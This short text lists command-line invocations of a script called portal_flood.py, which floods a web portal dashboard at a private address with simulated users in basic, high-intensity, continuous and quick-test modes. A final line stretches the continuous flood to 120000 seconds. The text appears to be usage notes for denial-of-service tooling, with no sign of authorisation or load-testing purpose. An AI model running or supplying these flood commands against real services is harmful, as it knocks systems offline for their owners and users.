1. Basic Flood (1000 users):
   bash
   python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --users 1000
2. High-Intensity Flood (5000 users, 500 concurrent):
   bash
   python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --users 5000 --threads 500
3. Continuous Flood (2 minutes):
   bash
   python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --continuous --duration 120 --threads 200
4. Quick Test (100 users):
   bash
   python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --users 100

python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --continuous --duration 120000 --threads 200
